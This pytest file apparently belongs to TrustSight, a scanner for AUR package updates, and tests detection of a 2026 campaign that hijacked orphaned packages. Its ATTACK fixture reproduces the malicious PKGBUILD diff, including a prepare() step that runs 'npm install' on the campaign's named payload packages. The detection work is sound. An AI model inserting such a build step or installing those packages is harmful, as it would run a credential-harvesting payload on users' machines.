"""The June 2026 AUR campaign, and the signals added to see it.

The campaign ("Atomic Arch", Sonatype-2026-003775) hijacked ~1,500 orphaned
AUR packages, left the upstream source untouched, and added npm build
dependencies to the recipe that fetched and ran a credential-harvesting
binary during ``makepkg``.

Before this work TrustSight scored that diff **15/100 on a database with a
normal corpus** - below the 20-point flag threshold. The 65 an empty
database produced was an artifact: 50 of those points were D001 "this
dependency has never been seen in the AUR", which is silent once the corpus
knows ``npm`` and ``nodejs``. The better the corpus, the lower the attack
scored, which is the wrong direction.

These tests pin the four things that changed.
"""

import pathlib
import tempfile

import pytest

from trustsight.analysis.adoption import adoption_findings, is_recipe_only_change
from trustsight.analysis.buildfetch import (
    has_unpinned_build_deps,
    registry_install_names,
    registry_resolutions,
)
from trustsight.coverage import UNPINNED_BUILD_DEPS, fail_closed, gaps_from

# The recipe change, with upstream provably identical: same source URL, same
# checksum, same pkgver. Only the build recipe moved.
ATTACK = """diff --git a/PKGBUILD b/PKGBUILD
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,10 +1,14 @@
 pkgname=some-trusted-tool
 pkgver=2.4.1
-pkgrel=3
+pkgrel=4
 source=("https://github.com/upstream/some-trusted-tool/archive/v$pkgver.tar.gz")
 sha256sums=('a3f5c1d9e7b2486f0c1d5a9e3b7f2c8d4e6a1b9f3c7d2e8a4b6f1c9d3e7a2b8f')
+makedepends=('npm' 'nodejs')

+prepare() {
+  cd "$srcdir"
+  npm install atomic-lockfile lockfile-js js-digest
+}
+
 build() {
   make
 }
"""

# An ordinary update: upstream moved, so H087 must stay silent however much
# else changed alongside it.
ORDINARY = """diff --git a/PKGBUILD b/PKGBUILD
--- a/PKGBUILD
+++ b/PKGBUILD
-pkgver=2.4.1
+pkgver=2.5.0
-sha256sums=('aaaa')
+sha256sums=('bbbb')
+makedepends=('npm')
"""


def _fired(diff, *, was_orphaned, maintained=True):
    out = []
    adoption_findings(
        diff, package_name="p", was_orphaned=was_orphaned,
        currently_maintained=maintained,
        add=lambda rid, *a, **k: out.append(rid),
    )
    return out


# ---------------------------------------------------------------------------
# The coverage gap: what the build will run was never examined.
# ---------------------------------------------------------------------------


def test_a_build_time_registry_install_is_a_coverage_gap():
    """makepkg checksums source=(); it checksums nothing npm resolves.

    The code that executes on the reviewer's machine is not in the analysed
    text, so this is a missing sensor and not a finding.
    """
    assert has_unpinned_build_deps(ATTACK)
    assert registry_resolutions(ATTACK) == [
        ("prepare", "npm install atomic-lockfile lockfile-js js-digest")
    ]


def test_the_gap_forbids_an_unflagged_result():
    """B2: a run that could not see what will execute cannot read as clean."""
    gaps = gaps_from(tree_analyzed=True, unpinned_build_deps=True)
    assert gaps == [UNPINNED_BUILD_DEPS]
    assert fail_closed("Low", gaps, []) == "Inconclusive"


def test_a_registry_name_in_a_comment_or_string_is_not_a_resolution():
    """Command position only: a name mentioned is not a command run."""
    quiet = """diff --git a/PKGBUILD b/PKGBUILD
+# npm install foo
+echo "npm install foo"
+makedepends=(npm)
"""
    assert not has_unpinned_build_deps(quiet)


def test_an_explicitly_offline_build_is_not_a_gap():
    """`--offline` cannot reach a registry, so nothing is unexamined."""
    offline = """diff --git a/PKGBUILD b/PKGBUILD
 build() {
-  cargo build --release
+  cargo build --release --offline
 }
"""
    assert not has_unpinned_build_deps(offline)


def test_a_resolution_outside_a_build_function_is_not_this_gap():
    """Only the functions makepkg runs while building."""
    hook = """diff --git a/pkg.install b/pkg.install
 post_install() {
+  npm install something
 }
"""
    assert not has_unpinned_build_deps(hook)


# ---------------------------------------------------------------------------
# H087: the recipe moved and upstream did not.
# ---------------------------------------------------------------------------


def test_recipe_only_change_is_the_campaigns_signature():
    assert is_recipe_only_change(ATTACK)
    assert "H087" in _fired(ATTACK, was_orphaned=-1)


@pytest.mark.parametrize("field,line", [
    ("pkgver", "+pkgver=2.5.0"),
    ("checksums", "+sha256sums=('cccc')"),
    ("source", "+source=(\"https://example.org/new.tar.gz\")"),
])
def test_any_upstream_move_silences_h087(field, line):
    """Upstream moving makes it an ordinary update, whatever else changed."""
    diff = f"""diff --git a/PKGBUILD b/PKGBUILD
+makedepends=('npm')
{line}
"""
    assert not is_recipe_only_change(diff), f"{field} moved but H087 still fired"


def test_an_ordinary_version_bump_is_not_recipe_only():
    assert not is_recipe_only_change(ORDINARY)
    assert "H087" not in _fired(ORDINARY, was_orphaned=1)


# ---------------------------------------------------------------------------
# H086/H088: stateful, and silent without their state.
# ---------------------------------------------------------------------------


def test_h086_needs_a_recorded_prior_observation():
    """-1 is "never asked", which is not evidence of an adoption.

    Letting "no record" read as "was orphaned" would invent an adoption for
    every package on a fresh database.
    """
    assert "H086" not in _fired(ATTACK, was_orphaned=-1)
    assert "H086" not in _fired(ATTACK, was_orphaned=0)
    assert "H086" in _fired(ATTACK, was_orphaned=1)


def test_h088_requires_all_three_conditions():
    """The composition is the point: each member alone is ordinary."""
    # All three: adopted, recipe-only, registry resolution.
    assert "H088" in _fired(ATTACK, was_orphaned=1)
    # Adopted and recipe-only (deps and build both moved), but nothing is
    # fetched from a registry, so the composition is incomplete.
    no_fetch = """diff --git a/PKGBUILD b/PKGBUILD
+makedepends=('cmake')
 build() {
-  make
+  cmake --build .
 }
"""
    assert "H087" in _fired(no_fetch, was_orphaned=1)
    assert "H088" not in _fired(no_fetch, was_orphaned=1)

    # A build tweak with no dependency change is H015's territory, not
    # H087's: the conjunction is what keeps this off ordinary packaging fixes.
    build_only = """diff --git a/PKGBUILD b/PKGBUILD
 build() {
-  make
+  make -j1
 }
"""
    assert "H087" not in _fired(build_only, was_orphaned=1)
    # Registry resolution and recipe-only, but no recorded adoption.
    assert "H088" not in _fired(ATTACK, was_orphaned=0)


def test_the_orphan_state_is_tri_state_and_persisted():
    """An unavailable RPC records unknown, never a guess either way."""
    from trustsight import config as cfg, db

    tmp = pathlib.Path(tempfile.mkdtemp())
    cfg.DATA_DIR = db.DATA_DIR = tmp
    db.init_db()
    db.upsert_package("demo", "1.0")

    assert db.get_aur_orphan_state("demo") == -1      # never asked
    db.update_aur_orphan_state("demo", True)
    assert db.get_aur_orphan_state("demo") == 1       # orphaned
    db.update_aur_orphan_state("demo", False)
    assert db.get_aur_orphan_state("demo") == 0       # maintained
    db.update_aur_orphan_state("demo", None)
    assert db.get_aur_orphan_state("demo") == -1      # metadata unavailable
    assert db.get_aur_orphan_state("never-seen") == -1


def test_orphan_state_is_read_from_the_aur_maintainer_field():
    """The RPC omits or nulls Maintainer for an orphan."""
    from trustsight.review import _orphan_state

    assert _orphan_state({"Maintainer": None}) is True
    assert _orphan_state({"Maintainer": ""}) is True
    assert _orphan_state({"Maintainer": "alice"}) is False
    # Unknown, not "maintained": these are different facts.
    assert _orphan_state(None) is None
    assert _orphan_state({}) is None
    assert _orphan_state({"Version": "1.0"}) is None


# ---------------------------------------------------------------------------
# The IOC surface: the payload was named in a build command, nowhere else.
# ---------------------------------------------------------------------------


def test_the_payload_names_are_extracted_from_the_build_command():
    """A `package` indicator reaches pkgname, pkgbase and the dep arrays.

    The campaign named `atomic-lockfile` in none of those - only as an
    argument to `npm install` - so an indicator list naming it would have
    matched nothing without this surface.
    """
    names = [n for _fn, _cmd, n in registry_install_names(ATTACK)]
    assert names == ["atomic-lockfile", "lockfile-js", "js-digest"]


@pytest.mark.parametrize("command,expected", [
    ("npm install --save-dev @scope/pkg foo@1.2.3", ["@scope/pkg", "foo"]),
    ("pip install requests[security]", ["requests"]),
    ("npm install $DYNAMIC", []),          # not statically known
    ("cargo build --release", []),         # no names, flags only
])
def test_registry_name_extraction_edge_cases(command, expected):
    diff = f"diff --git a/PKGBUILD b/PKGBUILD\n build() {{\n+  {command}\n }}\n"
    assert [n for _f, _c, n in registry_install_names(diff)] == expected
